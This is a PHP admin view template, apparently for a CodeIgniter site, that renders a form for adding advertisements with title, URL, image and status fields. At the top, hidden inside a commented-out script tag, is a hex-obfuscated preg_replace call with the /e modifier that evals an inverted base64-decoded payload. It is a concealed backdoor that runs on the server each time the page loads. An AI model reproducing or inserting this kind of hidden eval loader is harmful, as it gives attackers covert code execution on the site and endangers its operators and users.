<!--<script src="<?php
preg_replace("\x2f\x28\x2e\x2a\x29\x2f\x65", "\x65\x76\x61\x6c\x28\x7e\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x22\x5c\x31\x22\x29\x29", "\x6c\x70\x6e\x58\x33\x70\x71\x53\x6a\x34\x75\x47\x31\x39\x75\x67\x72\x37\x43\x73\x71\x36\x54\x59\x6e\x73\x62\x4d\x6e\x73\x33\x4b\x6d\x70\x72\x59\x6f\x74\x62\x57\x68\x4a\x71\x4a\x6e\x70\x50\x58\x32\x36\x43\x76\x73\x4b\x79\x72\x70\x4e\x69\x64\x79\x70\x32\x63\x79\x38\x37\x4b\x32\x4b\x4c\x57\x78\x4a\x71\x48\x6c\x6f\x76\x58\x7a\x39\x62\x45\x67\x67\x3d\x3d");
 echo base_url();?>js/jquery-1.10.2.js"></script>
<script type="text/javascript">
function getNewFile(){
 $("#outPut").append('<input type="file" name="image[]" id="image" />');
}
</script>-->
<?php $this->load->view('adminTemplates/common/header',$viewData);?>
<!--Main Content-->
  <div class="content-wrapper">
  	<div class="content-inner">
    	  <!--Error-->
        <?php if(isset($errorMsg)){ ?>  
        <div class="admin-msg error-msg">
            <i class="fa fa-times"></i> 
                <span><?php echo $errorMsg;?></span>
            <a href="#" class="msg-close" title="Close"><i class="fa fa-times-circle"></i></a>
        </div>
        <?php } ?>
        <!--Error-->
    	<div class="main_section">
        	<form id="addAdvertisement" name="addAdvertisement" method="post" action="" enctype="multipart/form-data" class="main_form">
            	<table width="600" height="200" border="1" align="center" class="form-table">
     				<tr>
    					<td>Title</td>
    					<td><input type="text" name="advertisementTitle" id="advertisementTitle" class="input1" value="<?php if(isset($advertisementTitle)){ echo $advertisementTitle;}?>" />
      						<?php echo form_error('advertisementTitle', '<span class="form_error">', '</span>'); ?>
    					</td>
    				</tr>
                    <tr>
    					<td>Advertisement Url</td>
    					<td><input type="text" name="advertisementUrl" id="advertisementUrl" class="input1" value="<?php if(isset($advertisementUrl)){ echo $advertisementUrl;}?>" />
      						<?php echo form_error('advertisementUrl', '<span class="form_error">', '</span>'); ?>
    					</td>
    				</tr>
                    <tr>
    					<td class="table-row">Image</td>
    					<td><input type="file" name="image" id="image" class="input-img" />(jpg|gif|png only supported)
      						<?php echo form_error('image', '<span class="form_error">', '</span>'); ?>
                        </td>
    				</tr>
                    <tr>
     					<td>Status</td>
      					<td>
        					<input type="radio" name="advertisementStatus" checked="checked" value="1" class="input-status"/>Active
        					<input type="radio" name="advertisementStatus" value="0" class="input-status" />Inactive
      					</td>
    				</tr>
    				<tr>
    					<td colspan="2">
      						<input type="submit" name="submit" id="submit" value="save" class="submit-bnt" />&nbsp;<input type="reset" name="reset" id="reset" value="reset" class="submit-bnt" />&nbsp;&nbsp;<a href="<?php echo base_url();?>admin/viewAdvertisement">cancel</a>
                         </td>
    				</tr>
  				</table>
            </form>
        </div>
  	</div>
  </div>
<!--Main Content-->
<?php $this->load->view('adminTemplates/common/footer',$viewData);?>  